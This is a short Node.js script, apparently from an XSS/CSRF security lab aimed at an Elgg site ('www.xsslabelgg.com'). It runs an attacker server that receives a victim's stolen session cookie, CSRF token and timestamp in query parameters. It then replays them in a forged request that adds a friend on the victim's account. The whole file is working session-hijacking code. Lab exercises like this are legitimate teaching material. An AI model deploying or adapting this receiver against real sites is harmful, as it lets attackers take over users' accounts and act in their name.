'use strict';

const http = require('http');

const PORT = 5555;

http.createServer((req, res) => {

  let session;
  let token;
  let timestamp;

  // Grab query params
  let params = req.url.split('?').pop().split('&').map(x => x.split('='));

  // Loop through params and look for relevant info
  for (let param of params) {
    if (param[0] === 'c') session = decodeURIComponent(param[1]);
    if (param[0] === 't') token = decodeURIComponent(param[1]);
    if (param[0] === 's') timestamp = decodeURIComponent(param[1]);
  }

  // Send the forged request
  addFriend(session, token, timestamp);

  // Respond `Hello, World` on every request
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Hello World\n');
}).listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});

function addFriend(session, token, timestamp) {
  if (!session || !token || !timestamp) return;

  console.log('Adding friend:');
  console.log(session, token, timestamp);

  let params = [
    ['friend', 40],
    ['__elgg_token', encodeURIComponent(token)],
    ['__elgg_ts', encodeURIComponent(timestamp)]
  ];

  let encodedSession = encodeURIComponent(session);
  let encodedParams = params.map(p => p.join('=')).join('&');

  let request = http.request({
    protocol: 'http:',
    host: 'www.xsslabelgg.com',
    port: 80,
    method: 'GET',
    path: `/action/friends/add?${encodedParams}`,
    headers: {
      'Cookie': `Elgg=${encodedSession}`
    }
  });

  request.end();
}
